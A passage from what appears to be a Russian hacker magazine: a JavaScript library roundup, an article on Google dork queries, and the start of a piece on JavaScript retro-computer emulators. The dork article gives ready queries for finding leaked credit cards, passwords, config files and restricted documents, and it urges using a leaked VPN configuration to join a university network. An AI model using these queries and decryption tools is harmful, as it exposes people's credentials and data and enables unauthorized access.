 ки веб-страничек, «искажая» классическое представление о верстке с HTML
 и CSS. Многие из них обрели свою аудиторию, но сегодня пойдет речь, ве-
 роятно, о самом популярном методе нестандартного позиционирования эле-
 ментов, который пришел в веб из мира десктопной и мобильной разработки.
Это — Auto Layout (система разметки на основе математических соотношений,
 ограничений) и VFL (Visual Format Language), которые используются корпора-
 цией Apple в iOS и OSX.
   Ну а AutoLayout.js, как ты уже догадался, интерпретирует данный синтак-
 сис в твоем браузере. Проект написан на ES6, в его основе лежит библио-
 тека Сassowary.js (github.com/slightlyoff/cassowary.js) для построения гибких,
 адаптируемых макетов без необходимости писать кучу императивного кода.
 Также есть специальная песочница для опробования синтаксиса.
   Синтаксис прост. |-element1(element2) (-element2 (-| — каждый ряд об-
 рамляется символами |, между ними в квадратных скобках через дефис описа-
ны внутренние блоки (синтаксис визуально напоминает результат), а в круглых
 скобках — зависимость между ними. Для описания колонок применяется код
следующего вида: V:|-[...]-|. Я описал лишь самые базовые принципы размет-
 ки. Вообще, VFL по своим возможностям нисколько не уступает связке HTML
 и CSS.
   Важно упомянуть, что, судя по ToDo-листу, AutoLayout.js на данный момент
 обеспечивает не более половины этих возможностей. Тем не менее проект
 достаточно перспективен.





Dynamics.js

 github.com/michaelvillar/dynamics.js
Еще одна библиотека для физически правильных анимаций, основанных
 на CSS. Dynamics.js взорвала трендинг-лист на GitHub и за неделю собра-
 ла более 3000 звезд. Анимации работают как для HTML-элементов, так
 и для SVG. А изюминка заключается в специальных опциях frequency, friction,
 anticipationSize, anticipationStrength — с их помощью у тебя всегда будет полу-
 чаться уникальный и в то же время правильный для анимации график Безье.





EON

 github.com/pubnub/eon
 Проект от компании Pubnub, которая занимается стримингом данных между
любыми устройствами: вебом, мобильным и IoT. А EON представляет собой
 реалтаймовые дашборды eon-chart, основанные на D3.js (для графиков) и eon-
map (для интерактивных карт).

 var channel = "c3-donut" + Math.random();
 eon.chart({
   channel: channel,
   generate: {
     bindto: '#chart',
     data: {
       labels: true,
       type: 'donut'
     }
   }
 });
 var pubnub = PUBNUB.init({
   publish_key: 'demo',
   subscribe_key: 'demo'
 });
 setInterval(function(){
   pubnub.publish({
     channel: channel,
     message: {
       columns: [
          ['Austin', Math.floor(Math.random() * 99)],
         ['New York', Math.floor(Math.random() * 99)],
          ['San Francisco', Math.floor(Math.random() * 99)],
          ['Portland', Math.floor(Math.random() * 99)]
       ]
     }
   });
 }, 1000);





Legit

 github.com/kennethreitz/legit
 «Git for Humans, Inspired by GitHub for Mac™». Удобный синтаксический сахар
 для Git.
 •  sync [<branch>] — синхронизирует выбранную ветку. Соответствует Git-вы-
   зовам Stash, Fetch, Auto-Merge/Rebase, Push и Unstash.
 •  branches — показывает список веток.
 •  switch <branch> — переключает на выбранную ветку, а все изменения ухо-
   дят в stash и применяются после переключения.
 •  sprout [<branch>] <new-branch> — создает новую ветку на основе выбран-
   ной или текущей по дефолту и переключает на нее.
 •  graft <branch> <into-branch> — вносит первый бранч во второй и удаляет
   первый. Работает только с локальными ветками.
 •  publish <branch> — публикует указанный бранч к удаленному.
 •  unpublish <branch> — удаляет указанный бранч.





ToProgress

 github.com/djyde/ToProgress
 Настало время, когда многие веб-проекты уже выглядят как полноценные де-
 сктопные или мобильные приложения. И важным UI-элементом в них являет-
 ся прогресс-бар. ToProgress — миниатюрная (два килобайта) и максимально
 простая библиотека для создания прогресс-баров. Обладает всего семью
 методами: .increase(), .decrease(), .reset(), .finish(), .show(), .hide(), .setProgress().





NotifyMe

 github.com/shivkumarganesh/NotifyMe
Крошечный скрипт — обертка над HTML5 Notification API, который значительно
 упростит задачу реализации браузерных уведомлений.

 (function(){
     // To build the option Object with data
     var options = {
         icon: 'http://i.istockimg.com/file_thumbview_approve/46749378/3/
          stock-illustration-46749378-cute-piglet-icon-animal-icons-series.jpg',
         body: 'This is a simple demo for the notification API',
         onclick: function(){
              console.log("On     Click Triggered");
          },
         onerror: function(){
              console.log("On Error Triggered");
          },
         onclose:function(){
              console.log("On Close Triggered");
         }
     };
     // Actual Implementation of NotifyMe.js
     NotifyMe.launch("Журнал Хакер",options);
 })();





Talkie.js

 github.com/ahomu/Talkie
 Простая и универсальная библиотека для создания презентаций. Talkie.js
 поддерживает синтаксис Markdown, подсветку кода, управление клавиатурой,
 «трогательные» (ну и словечко! — Прим. ред.) интерфейсы, полноэкранный
 режим, прогресс-бар, а в скором времени должны появиться ряд анимаций
 при переходе, превью и Layout attributes (WIP). Также предоставляет полноцен-
ный API для управления слайд-шоу и захвата всех событий.

 <html>
 <head>
   <link rel="stylesheet" href="./dist/talkie.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/
    libs/highlight.js/8.4/styles/monokai_sublime.min.css">
 </head>
 <body>
 <!-- Pure HTML style -->
 <section layout>
   <h1>Slide 1</h1>
 </section>
 <!-- Markdown style ( require 'type' attribute ) -->
 <script layout type="text/x-markdown">
 # Slide 2
 </script>
 <!-- You can also use '<template>' element -->
 <template layout type="text/x-markdown">
 # Slide 2
 </template>
 <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/
  highlight.min.js"></script>
 <script src="./dist/talkie.js"></script>
 <script>Talkie();</script>
 </body>
 </html>





Sprint.js

 github.com/bendc/sprint
 Рекордсмен по производительности всевозможных манипуляций с DOM.
На странице проекта на GitHub приведены примеры тестов по различным ме-
 тодам, где Sprint в разы, если не в десятки раз опережает по скорости jQuery
 и Zepto. Sprint, подобно конкурентам, обладает «цепочечным» синтаксисом.
Важно подчеркнуть, что хоть Sprint и имеет полностью аналогичные названия
 функций, но это именно библиотека для работы с DOM, в которой нет того мно-
 жества функций упомянутых библиотек.





Whoops

 github.com/filp/whoops
Фреймворк для обработки ошибок в PHP. Прямо «из коробки» Whoops предо-
 ставляет удобный интерфейс с описанием ошибок для дебага твоего проек-
 та. Простой API, возможность открывать ссылки на файлы в твоем редакторе
 или IDE, обработчики для различных форматов ответа (JSON, XML, SOAP), Silex
 Service Provider, Phalcon Service Provider, модули Zend Framework 2 и простая
 интеграция с другими подключаемыми библиотеками.





Boron.js

 github.com/yuanyan/boron
На протяжении долгого времени наиболее популярными библиотеками
 для фронтенда были Backbone, Angular и Ember. Но в этом ряду уверенно за-
 нял место React — мощный инструмент для описания интерфейсов от FB, под
 который постоянно появляются различные модули и плагины. А Boron.js — это
 как раз и есть библиотека для создания модальных окон на основе React с ше-
 стью типами различных анимаций. Выглядит действительно здорово, лучше
 посмотреть, чем читать.
PC ZONE

ПОИСК ГОЛЫМИ РУКАМИ
     ИСПОЛЬЗУЕМ МАЛОИЗВЕСТНЫЕ
         ФУНКЦИИ GOOGLE,
       ЧТОБЫ НАЙТИ СОКРЫТОЕ





Получение частных данных не всегда
означает взлом — иногда они опубли
кованы в общем доступе. Знание
настроек Google и немного смекалки                 84ckf1r3
                                                                                              84ckf1r3@gmail.com
позволят найти массу интересного —
от номеров кредиток до документов ФБР.

К интернету сегодня подключают всё подряд, мало заботясь об ограничении
доступа. Поэтому многие приватные данные становятся добычей поискови
ков. Роботы-«пауки» уже не ограничиваются веб-страницами, а индексируют
весь доступный в Сети контент и постоянно добавляют в свои базы не предна
значенную для разглашения информацию. Узнать эти секреты просто — нужно
лишь знать, как именно спросить о них.

ИЩЕМ ФАЙЛЫ
В умелых руках Google быстро найдет все, что плохо ле
жит в Сети, — например, личную информацию и файлы для
служебного использования. Их частенько прячут, как ключ
под половиком: настоящих ограничений доступа нет, дан
ные просто лежат на задворках сайта, куда не ведут ссыл
ки. Стандартный веб-интерфейс Google предоставляет                                               WARNING
лишь базовые настройки расширенного поиска, но даже
их будет достаточно.                                              Вся информация предо-
                                                                             ставлена исключитель-   Ограничить поиск по файлам определенного вида                                                                        но в ознакомительных
в Google можно с помощью двух операторов: filetype и ext.     целях. Ни редакция,
Первый задает формат, который поисковик определил по   ни автор не несут ответ-
                                                                              ственности за любойзаголовку файла, второй — расширение файла, независи                                                                    возможный вред, при-
мо от его внутреннего содержимого. При поиске в обоих                                                                       чиненный материалами
случаях нужно указывать лишь расширение. Изначально       данной статьи.
оператор ext было удобно использовать в тех случаях, ког
да специфические признаки формата у файла отсутствовали (например, для по
иска конфигурационных файлов ini и cfg, внутри которых может быть все что
угодно). Сейчас алгоритмы Google изменились, и видимой разницы между опе
раторами нет — результаты в большинстве случаев выходят одинаковые.





Результаты поиска с filetype и ext теперь одинаковые

ФИЛЬТРУЕМ ВЫДАЧУ
По умолчанию слова и вообще любые введенные символы Google ищет по
всем файлам на проиндексированных страницах. Ограничить область поиска
можно по домену верхнего уровня, конкретному сайту или по месту располо
жения искомой последовательности в самих файлах. Для первых двух вариан
тов используется оператор site, после которого вводится имя домена или вы
бранного сайта. В третьем случае целый набор операторов позволяет искать
информацию в служебных полях и метаданных. Например, allinurl отыщет
заданное в теле самих ссылок, allinanchor — в тексте, снабженном тегом
<a name>, allintitle — в заголовках страниц, allintext — в теле страниц.
   Для каждого оператора есть облегченная версия с более коротким назва
нием (без приставки all). Разница в том, что allinurl отыщет ссылки со всеми
словами, а inurl — только с первым из них. Второе и последующие слова из
запроса могут встречаться на веб-страницах где угодно. Оператор inurl тоже
имеет отличия от другого схожего по смыслу — site. Первый также позволяет
находить любую последовательность символов в ссылке на искомый документ
(например, /cgi-bin/), что широко используется для поиска компонентов с из
вестными уязвимостями.
   Попробуем на практике. Берем фильтр allintext и делаем так, чтобы за
прос выдал список номеров и проверочных кодов кредиток, срок действия ко
торых истечет только через два года (или когда их владельцам надоест кормить
всех подряд).

allintext: card number expiration date /2017 cvv





275 тысяч актуальных кредиток, фейков и ханипотов для любителей халявы

Когда читаешь в новостях, что юный хакер «взломал серве
ры» Пентагона или NASA, украв секретные сведения, то в
большинстве случаев речь идет именно о такой элемен
тарной технике использования Google. Предположим, нас
интересует список сотрудников NASA и их контактные дан
ные. Наверняка такой перечень есть в электронном виде.    WWW
Для удобства или по недосмотру он может лежать и на са
                                                                Примеры использованиямом сайте организации. Логично, что в этом случае на него                                                                          операторов расширен-
не будет ссылок, поскольку предназначен он для внутрен     ного поиска в Google
него использования. Какие слова могут быть в таком фай
                                                                      Обновляемая подборкале? Как минимум — поле «адрес». Проверить все эти пред
                                                                               Google dorks
положения проще простого.
  Пишем

inurl:nasa.gov filetype:xlsx "address"

и получаем ссылки на файлы со списками сотрудников.





Используя два оператора, можно получить «секретные» документы NASA за 0,36 с





Адреса и телефоны ключевых сотрудников NASA в файле Excel

ПОЛЬЗУЕМСЯ БЮРОКРАТИЕЙ
Подобные находки — приятная мелочь. По-настоящему же солидный улов
обеспечивает более детальное знание операторов Google для веб-мастеров,
самой Сети и особенностей структуры искомого. Зная детали, можно легко
отфильтровать выдачу и уточнить свойства нужных файлов, чтобы в остатке по
лучить действительно ценные данные. Забавно, что здесь на помощь приходит
бюрократия. Она плодит типовые формулировки, по которым удобно искать
случайно просочившиеся в Сеть секретные сведения.
   Например, обязательный в канцелярии министерства обороны США штамп
Distribution statement означает стандартизированные ограничения на распро
странение документа. Литерой A отмечаются публичные релизы, в которых нет
ничего секретного; B — предназначенные только для внутреннего использо
вания, C — строго конфиденциальные и так далее до F. Отдельно стоит литера
X, которой отмечены особо ценные сведения, представляющие государствен
ную тайну высшего уровня. Пускай такие документы ищут те, кому это положе
но делать по долгу службы, а мы ограничимся файлами с литерой С. Согласно
директиве DoDI 5230.24, такая маркировка присваивается документам, содер
жащим описание критически важных технологий, попадающих под экспортный
контроль. Обнаружить столь тщательно охраняемые сведения можно на сайтах
в домене верхнего уровня .mil, выделенного для армии США.

"DISTRIBUTION STATEMENT C" inurl:navy.mil

Очень удобно, что в домене .mil собраны только сайты из ведомства МО США
и его контрактных организаций. Поисковая выдача с ограничением по домену по
лучается исключительно чистой, а заголовки — говорящими сами за себя. Искать
подобным образом российские секреты практически бесполезно: в доменах .ru и
.рф царит хаос, да и названия многих систем вооружения звучат как ботанические
(ПП «Кипарис», САУ «Акация») или вовсе сказочные (ТОС «Буратино»).
   Внимательно изучив любой документ с сайта в домене .mil, можно увидеть
и другие маркеры для уточнения поиска. Например, отсылку к экспортным огра
ничениям «Sec 2751», по которой также удобно искать интересную техническую
информацию. Время от времени ее изымают с официальных сайтов, где она
однажды засветилась, поэтому, если в поисковой выдаче не удается перейти
по интересной ссылке, воспользуйся кешем Гугла (оператор cache) или сайтом
Internet Archive.





Пример штампа в документе уровня секретности С





Чертеж из руководства к учебно-боевому вертолету TH-57С Sea Ranger


ЗАБИРАЕМСЯ В ОБЛАКА
Помимо случайно рассекреченных документов правительственных ведомств,
в кеше Гугла временами всплывают ссылки на личные файлы из Dropbox и дру
гих облачных сервисов, которые создают «приватные» ссылки на публично опу
бликованные данные. С альтернативными и самодельными сервисами еще
хуже. Например, следующий запрос находит данные всех клиентов Verizon, у
которых на роутере установлен и активно используется FTP-сервер.

allinurl:ftp:// verizon.net

Таких умников сейчас нашлось больше сорока тысяч, а весной 2015-го их было
на порядок больше. Вместо Verizon.net можно подставить имя любого из
вестного провайдера, и чем он будет известнее, тем крупнее может быть улов.
Через встроенный FTP-сервер видно файлы на подключенном к маршрутиза
тору внешнем накопителе. Обычно это NAS для удаленной работы, персональ
ное облако или какая-нибудь пиринговая качалка файлов. Все содержимое та
ких носителей оказывается проиндексировано Google и другими поисковиками,
поэтому получить доступ к хранящимся на внешних дисках файлам можно по
прямой ссылке.





Серийники, документы и еще сорок тысяч файлов с частных облаков

ПОДСМАТРИВАЕМ КОНФИГИ
До повальной миграции в облака в качестве удаленных хранилищ рулили про
стые FTP-серверы, в которых тоже хватало уязвимостей. Многие из них актуаль
ны до сих пор. Например, у популярной программы WS_FTP Professional дан
ные о конфигурации, пользовательских аккаунтах и паролях хранятся в файле
ws_ftp.ini. Его просто найти и прочитать, поскольку все записи сохраняются
в текстовом формате, а пароли шифруются алгоритмом Triple DES после ми
нимальной обфускации. В большинстве версий достаточно просто отбросить
первый байт.
   Расшифровать такие пароли легко с помощью утилиты WS_FTP Password
Decryptor или бесплатного веб-сервиса.
   Говоря о взломе произвольного сайта, обычно подразумевают получение
пароля из логов и бэкапов конфигурационных файлов CMS или приложений
для электронной коммерции. Если знаешь их типовую структуру, то легко смо
жешь указать ключевые слова. Строки, подобные встречающимся в ws_ftp.
ini, крайне распространены. Например, в Drupal и PrestaShop обязательно
есть идентификатор пользователя (UID) и соответствующий ему пароль (pwd),
а хранится вся информация в файлах с расширением .inc. Искать их можно сле
дующим образом:

"pwd=" "UID=" ext:inc





Один из файлов ws_ftp.ini в открытом доступе





Расшифровка пароля занимает около секунды

РАСКРЫВАЕМ ПАРОЛИ ОТ СУБД
В конфигурационных файлах SQL-серверов имена и адреса электронной по
чты пользователей хранятся в открытом виде, а вместо паролей записаны их
хеши MD5. Расшифровать их, строго говоря, невозможно, однако можно найти
соответствие среди известных пар хеш — пароль.
  До сих пор встречаются СУБД, в которых не используется даже хеширова
ние паролей. Конфигурационные файлы любой из них можно просто посмо
треть в браузере.

intext:DB_PASSWORD filetype:env

С появлением на серверах Windows место конфигурационных файлов отчасти
занял реестр. Искать по его веткам можно точно таким же образом, используя
reg в качестве типа файла. Например, вот так:

filetype:reg HKEY_CURRENT_USER "Password"=





Подбор пароля по хешу MD5

                                                           Пароль к базе
                                                          данных открыто
                                                               хранится в
                                                            конфигурационном
                                                         файле





                                                          Серверы
                                                                    с открытыми
                                                           окнами





НЕ ЗАБЫВАЕМ ПРО ОЧЕВИДНОЕ
Иногда добраться до закрытой информации удается с помощью случайно от
крытых и попавших в поле зрения Google данных. Идеальный вариант — найти
список паролей в каком-нибудь распространенном формате. Хранить сведе
ния аккаунтов в текстовом файле, документе Word или электронной таблице
Excel могут только отчаянные люди, но как раз их всегда хватает.

filetype:xls inurl:password





Национальный НИИ здоровья им. Ли Дэнхуэя случайно засветил список паролей

С одной стороны, есть масса средств для предотвращения подобных инциден
тов. Необходимо указывать адекватные права доступа в htaccess, патчить CMS,
не использовать левые скрипты и закрывать прочие дыры. Существует также
файл со списком исключений robots.txt, запрещающий поисковикам индекси
ровать указанные в нем файлы и каталоги. С другой стороны, если структура
robots.txt на каком-то сервере отличается от стандартной, то сразу становится
видно, что на нем пытаются скрыть.
   Список каталогов и файлов на любом сайте предваряется стандартной над
писью index of. Поскольку для служебных целей она должна встречаться в заго
ловке, то имеет смысл ограничить ее поиск оператором intitle. Интересные
вещи находятся в каталогах /admin/, /personal/, /etc/ и даже /secret/.





Белый дом приветствует роботов





Goolge помогает зреть в корень списка директорий

СЛЕДИМ ЗА ОБНОВЛЕНИЯМИ
Дырявых систем сегодня так много, что проблема заключается уже не в том,
чтобы найти одну из них, а в том, чтобы выбрать самые интересные (для изуче
ния и повышения собственной защищенности, разумеется). Примеры поиско
вых запросов, раскрывающие чьи-то секреты, получили название Google dorks.
Одной из первых утилит автоматической проверки защищенности сайтов по
известным запросам в Google была McAfee SiteDigger, но ее последняя версия
вышла в 2009 году. Сейчас для упрощения поиска уязвимостей есть масса дру
гих средств. К примеру, SearchDiggity авторства Bishop Fox, а также пополняе
мые базы с подборкой актуальных примеров.
   Актуальность тут крайне важна: старые уязвимости закрывают очень мед
ленно, но Google и его поисковая выдача меняются постоянно. Есть разница
даже между фильтром «за последнюю секунду» (&tbs=qdr:s в конце урла за
проса) и «в реальном времени» (&tbs=qdr:1).
   Временной интервал даты последнего обновления файла у Google тоже
указывается неявно. Через графический веб-интерфейс можно выбрать один
из типовых периодов (час, день, неделя и так далее) либо задать диапазон дат,
но такой способ не годится для автоматизации.
  По виду адресной строки можно догадаться только о способе ограничить
вывод результатов с помощью конструкции &tbs=qdr:. Буква y после нее за
дает лимит в один год (&tbs=qdr:y), m показывает результаты за последний
месяц, w — за неделю, d — за прошедший день, h — за последний час, n — за
минуту, а s — за секунду. Самые свежие результаты, только что ставшие из
вестными Google, находится при помощи фильтра &tbs=qdr:1.
   Если требуется написать хитрый скрипт, то будет полезно знать, что диапа
зон дат задается в Google в юлианском формате через оператор daterange.
Например, вот так можно найти список документов PDF со словом confidential,
загруженных c 1 января по 1 июля 2015 года.

confidential filetype:pdf daterange:2457024-2457205

Диапазон указывается в формате юлианских дат без учета дробной части. Пе
реводить их вручную с григорианского календаря неудобно. Проще восполь
зоваться конвертером дат.

ТАРГЕТИРУЕМСЯ И СНОВА ФИЛЬТРУЕМ
Помимо указания дополнительных операторов в поисковом запросе их можно
отправлять прямо в теле ссылки. Например, уточнению filetype:pdf соответ
ствует конструкция as_filetype=pdf. Таким образом удобно задавать любые
уточнения. Допустим, выдача результатов только из Республики Гондурас за
дается добавлением в поисковый URL конструкции cr=countryHN, а только из
города Бобруйск — gcs=Bobruisk. В разделе для разработчиков можно найти
полный список.
   Средства автоматизации Google призваны облегчить жизнь, но часто до
бавляют проблем. Например, по IP пользователя через WHOIS определяется
его город. На основании этой информации в Google не только балансируется
нагрузка между серверами, но и меняются результаты поисковой выдачи. В за
висимости от региона при одном и том же запросе на первую страницу попадут
разные результаты, а часть из них может вовсе оказаться скрытой. Почувство
вать себя космополитом и искать информацию из любой страны поможет ее
двухбуквенный код после директивы gl=country. Например, код Нидерлан
дов — NL, а Ватикану и Северной Корее в Google свой код не положен.
   Часто поисковая выдача оказывается замусоренной даже после исполь
зования нескольких продвинутых фильтров. В таком случае легко уточнить за
прос, добавив к нему несколько слов-исключений (перед каждым из них ставит
ся знак минус). Например, со словом Personal часто употребляются banking,
names и tutorial. Поэтому более чистые поисковые результаты покажет не
хрестоматийный пример запроса, а уточненный:

intitle:"Index of /Personal/" -names -tutorial -banking


ПРИМЕР НАПОСЛЕДОК
Искушенный хакер отличается тем, что обеспечивает себя
всем необходимым самостоятельно. Например, VPN —
штука удобная, но либо дорогая, либо временная и с огра
ничениями. Оформлять подписку для себя одного слиш
ком накладно. Хорошо, что есть групповые подписки, а с
                                                        INFOпомощью Google легко стать частью какой-нибудь груп
пы. Для этого достаточно найти файл конфигурации Cisco                                                                              Google находит
VPN, у которого довольно нестандартное расширение PCF     конфигурационные
и узнаваемый путь: Program Files\Cisco Systems\VPN     файлы с паролями,
                                                                           но многие из нихClient\Profiles. Один запрос, и ты вливаешься, к приме                                                                          записаны в зашиф-
ру, в дружный коллектив Боннского университета.               рованном виде или
                                                                       заменены хешами.
                                                                          Если видишь строкиfiletype:pcf vpn OR Group                                                                          фиксированной
                                                                              длины, то сразу
Пароли хранятся в зашифрованном виде, но Морис Мас    ищи сервис расшиф-
сар уже написал программу для их расшифровки и предо            ровки.
ставляет ее бесплатно через thecampusgeeks.com.
   При помощи Google выполняются сотни разных типов атак и тестов на про
никновение. Есть множество вариантов, затрагивающих популярные програм
мы, основные форматы баз данных, многочисленные уязвимости PHP, облаков
и так далее. Если точно представлять то, что ищешь, это сильно упростит по
лучение нужной информации (особенно той, которую не планировали делать
всеобщим достоянием). Не Shodan единый питает интересными идеями, но
всякая база проиндексированных сетевых ресурсов!





Поступить в Боннский университет значительно сложнее, чем подключиться к их VPN
PC ZONE

        БАЙТ
        ИЗ ДРУГИХ
       МИРОВ
              КАК РЕТРО
            КОМПЬЮТЕРЫ
            ЭМУЛИРУЮТ
             НА JAVASCRIPT





                                               Олег Парамонов
                                                      paramonov@sheep.ru





      браузере пока нельзя эмулировать PlayStation 2, но это лишь вопрос
      времени: Linux туда уже загружают, и он работает. Это кажется чудом, но
      никакого чуда нет: внутри такие эмуляторы очень просты.ВЭмуляция при помощи JavaScript стала возможна по двум причинам. Во-пер-
 вых, тег Canvas. Скажи спасибо Apple: десять лет назад именно эта компания
 разработала и встроила в WebKit технологию, которая позволяет при помощи
 JavaScript манипулировать отдельными пикселями на HTML-странице. Сейчас
 Canvas поддерживают все распространенные браузеры.
    Во-вторых, время. Большинство платформ, пригодных для эмуляции в бра-
 узере, появились в восьмидесятые годы прошлого века. Современные ком-
 пьютеры на много порядков быстрее устройств, которые были в ходу четверть
 века назад. Относительно невысокой производительности JavaScript с лихвой
 хватает для того, чтобы имитировать работу старинного железа.

                                                                   JSLinux эмулирует
                                                               в браузере ком-
                                                                 пьютер, способный
                                                                   загрузить полноцен-
                                                      ный Linux





   Исключение составляет JSLinux, нашумевший эмулятор ПК. Его в 2011 году
 разработал известный французский программист Фабрис Беллар — создатель
 FFmpeg, популярного средства кодирования и декодирования видео, которое
 используют VLC, MPlayer и YouTube, и универсального эмулятора аппаратного
 обеспечения QEMU. ПК и Linux — это вовсе не ретро, так ведь?
    Почти. Это уже не восьмидесятые, но и не сегодняшний день. Эмулятор
 Беллара представляет собой модель тридцатидвухразрядного процессора,
 напоминающего Intel 80486, к которому подключены контроллер прерываний,
 таймер, блок управления памятью, интерфейс IDE для взаимодействия с вирту-
 альным жестким диском и последовательный порт. Автор выкинул из процессо-
 ра все, без чего можно обойтись, в том числе поддержку вычислений с плаваю-
 щей точкой, а вместо графического дисплея использовал алфавитно-цифровой
 терминал — так проще.
   Тем, кто желает разобраться, как устроен JSLinux, можно порекомендовать
 аннотированную версию исходников проекта, выложенную на GitHub. В отличие
 от оригинала, они снабжены подробными комментариями, которые поясняют,
 какой именно функциональности x86-совместимого процессора или других
 элементов ПК соответствует тот или иной фрагмент кода.
   Как и в любом другом эмуляторе, центральную роль в JSLinux играет объект,
 моделирующий работу процессора. В данном случае соответствующий класс
 называется CPU_X86 и содержит переменные, в которых хранятся значения
 всех регистров и флагов, а также ссылки на «оперативную память» виртуаль-
 ного компьютера и методы для работы с ней. В принципе, ОЗУ можно было бы
 представить и в виде обычного целочисленного массива (так устроены многие
 другие эмуляторы), но Беллар нашел более эффективный вариант: он исполь-
 зовал типизированные массивы (их добавили в JavaScript относительно недав-
 но для работы с бинарными данными в WebGL). Кроме процессора, в эмуля-
 торе имеются отдельные объекты, имитирующие работу программируемого
 контроллера прерываний, последовательного порта и таймеров.
   Взаимодействие с внешним миром происходит при помощи виртуального
 последовательного порта: на вход поступает информация о нажатиях клавиш,
 а на выход направляются последовательности символов, предназначенные для
 вывода на алфавитно-цифровой консоли. По сути дела, терминал играет роль
 шлюза между двумя программными интерфейсами: по одну сторону находится
 браузер с событиями DOM, по другую — Linux, который получает данные через
 последовательный порт.
   При запуске эмулятор Беллара создает объект PCEmulator, содержащий
 объекты процессора и прочих компонентов компьютера, и выделяет 32 Мбайт
 памяти. Затем он инициализирует объекты устройств ввода-вывода и загружает
 в память образы ядра Linux и содержимого виртуальной «файловой системы»
 (они находятся в файлах vmlinux26.bin, root.bin и linuxstart.bin). После
 этого в регистр EIP (счетчик команд) помещается адрес, по которому оказалось
 содержимое vmlinux26.bin, в регистр EAX попадает величина виртуального
 ОЗУ в байтах, а в EBX — размер файла root.bin. Эмулятор готов к работе.
   Цикл работы процессора описан в методе timer_func класса PCEmulator.
 Он, если опустить детали, заключается в последовательном вызове метода
 exec_internal класса CPU_X86, который загружает и исполняет отдельные ко-
 манды машинного кода. Начало метода отмечено лаконичным комментарием:
 The Beast («Чудовище»). И не зря. Длина exec_internal без учета коммента-
 риев составляет порядка шести тысяч строк кода — это примерно 85% всего
 эмулятора. Метод идентифицирует команды, извлекает их аргументы и изменя-
 ет состояние процессора в соответствии с ними.
   Копаться в коде эмулятора Беллара трудно не столько из-за его сложности,
 сколько из-за размеров системы команд x86. Одно лишь перечисление реги-
 стров отнимет целую страницу. Но тот же принцип использует большинство
 других эмуляторов, написанных на JavaScript. Возьмем, к примеру, JSNES —
 эмулятор восьмибитной игровой приставки NES, которую выпускала компания
 Nintendo (в России эту приставку знают под названием «Денди»).

                                                             Игровая
                                                               приставка NES





   NES построена на базе восьмиразрядного процессора Ricoh 2A03, исполь-
 зующего систему команд MOS 6502 — популярного чипа, разработанного
 в середине семидесятых. Он очень прост не только по сравнению с Intel 80486,
 но и по сравнению с его современником — восьмиразрядным Intel 8080. MOS
 6502 имеет всего два регистра общего назначения (X и Y), аккумулятор для ма-
 тематических операций и три специальных регистра: регистр P, отдельные биты
 которого служат флагами процессора, указатель стека SP и счетчик команд PC.
 Все они, за исключением шестнадцатиразрядного PC, имеют длину восемь бит
 (старший байт указателя стека считается всегда равным 0x01).





 Начинка игровой приставки NES             Процессор Ricoh 2A03 под микроскопом

   Эмулировать такой процессор гораздо проще, чем Intel 80486. Как и в JSLinux,
 в JSNES есть объект, описывающий состояние процессора:

 JSNES.CPU = function() {
     this.mem = null;
     this.REG_ACC = null;
     this.REG_X = null;
     this.REG_Y = null;
     this.REG_SP = null;
     this.REG_PC = null;
     // Пропустим долгое перечисление флагов процессора
     this.reset();
 };

В методе reset выделяется память — целочисленный массив, состоящий из
 65 536 элементов. Именно таково максимальное число элементов, к которым
 можно обращаться при помощи шестнадцатиразрядных адресов:

 this.mem = new Array(0x10000);

 Затем эмулятор инициализирует регистры процессора. Хотя в действительно-
 сти в указателе стека MOS 6502 умещается не больше одного байта, в эмуля-
 торе он хранит полный адрес. Проще позаботиться о верной обработке пере-
 полнения значения регистра SP, чем составлять нужный адрес из нескольких
 частей всякий раз, когда нужно обратиться к стеку:

 this.REG_ACC = 0;
 this.REG_X = 0;
 this.REG_Y = 0;
 this.REG_SP = 0x01FF;
 this.REG_PC = 0x8000-1;

В JSNES, разумеется, есть свой аналог белларовского exec_internal — ме-
 тод, исполняющий отдельные команды машинного кода. Он называется emulate
 и хоть и не мал, но и не столь монструозен. После обработки прерываний
 emulate достает содержимое ячейки памяти, на которую указывает счетчик ко-
 манд, сдвигает счетчик команд на один байт вперед и готовится считать потра-
 ченные на работу такты:

 var opinf = this.opdata[this.nes.mmap.load(this.REG_PC+1)];
 var cycleCount = (opinf>>24);
 var cycleAdd = 0;
 var opaddr = this.REG_PC;
 this.REG_PC += ((opinf >> 16) & 0xFF);
 var addrMode = (opinf >> 8) & 0xFF;
 var addr = 0;

 Теперь ему необходимо определить, есть ли у команды аргумент, и вычислить
 его. В зависимости от значения переменной addrMode аргумент может находить-
 ся по адресу, на который указывает счетчик команд, содержаться в аккумуляторе
 или вычисляться без малого дюжиной различных способов. Наконец, он может
 просто отсутствовать. Значение аргумента сохраняется в переменной addr.
   Когда с этим покончено, приходит время выполнять команду. За это отвеча-
 ет оператор switch(opinf&0xFF), за которым следует несколько десятков воз-
 можных значений кода команды. Вот, к примеру, команда JMP. Она имеет код 27
 и вызывает безусловный переход по адресу, указанному в переменной addr:

 case 27: {
     this.REG_PC = addr-1;
     break;
 }

 Команда вызова подпрограммы JSR отличается тем, что перед переходом теку-
 щее значение счетчика команд отправляется в стек. Метод сохранения в стеке
 (push) вызывается дважды, потому что каждая ячейка стека вмещает не более
 восьми разрядов. Шестнадцатиразрядный адрес приходится сохранять в два
 приема — сначала старшие восемь разрядов, затем младшие:

 case 28:{
     this.push((this.REG_PC>>8)&255);
     this.push(this.REG_PC&255);
     this.REG_PC = addr-1;
     break;
 }

 При возврате из подпрограммы (команда RTS) половинки адреса добывают
 из стека в обратном порядке:

 case 42:{
     this.REG_PC = this.pull();
     this.REG_PC += (this.pull()<<8);
     if (this.REG_PC==0xFFFF) return; // return from NSF play routine:
     break;
 }

 Некоторые команды отвечают за операции с содержимым регистров и памятью.
 Вот, например, команда STA, сохраняющая значение аккумулятора по адресу,
 указанному в аргументе команды:

 case 47:{
     this.write(addr, this.REG_ACC);
     break;
 }

 Такой метод эмуляции называется интерпретацией. Он самый простой, самый
 распространенный и относительно неэффективный — но не настолько, чтобы
 это вызывало реальные затруднения. Справедливости ради нужно упомянуть
 два других метода: динамическую и статическую рекомпиляцию. В отличие от
 интерпретатора, рекомпилятор не исполняет команды по одной, а сперва пе-
 ремалывает код в более удобную форму: например, в тот же JavaScript, кото-
 рый можно скормить JIT-компилятору.
   При статической рекомпиляции обработке подлежит вся программа цели-
 ком. Для эмуляции ретрокомпьютеров, лихо мешающих код с данными и не гну-
